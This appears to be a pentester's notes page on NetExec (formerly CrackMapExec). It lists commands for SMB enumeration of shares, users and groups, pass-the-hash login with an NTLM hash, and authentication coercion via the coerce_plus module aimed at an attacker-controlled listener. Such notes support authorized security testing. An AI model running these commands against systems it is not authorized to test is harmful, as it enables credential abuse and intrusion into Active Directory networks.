# NetExec (nxc)

**Formerly:** CrackMapExec (cme)  
**Install:** `pipx install netexec`  
**Tags:** #tool #AD #windows #smb

---

## Overview
Swiss Army knife for Active Directory pentesting. Supports SMB, LDAP, WinRM, MSSQL, SSH and more.

## Common Usage

### SMB Enumeration
```bash
nxc smb <target> -u <user> -p <pass>
nxc smb <target> -u <user> -p <pass> --shares
nxc smb <target> -u <user> -p <pass> --users
nxc smb <target> -u <user> -p <pass> --groups
```

### Pass the Hash
```bash
nxc smb <target> -u <user> -H <NTLM_hash>
```

### coerce_plus Module
Tests for authentication coercion vulnerabilities (PetitPotam, PrinterBug, DFSCoerce, MSEven).
```bash
nxc smb <target> -u <user> -p <pass> -M coerce_plus -o LISTENER=<your_IP>
```

### Targets
- Single IP: `192.168.1.10`
- Hostname: `dc01.domain.local`
- CIDR: `192.168.1.0/24`
- File (one per line): `targets.txt`

## Related
- [[tools/responder]]
- [[playbooks/ad-coercion-validation]]
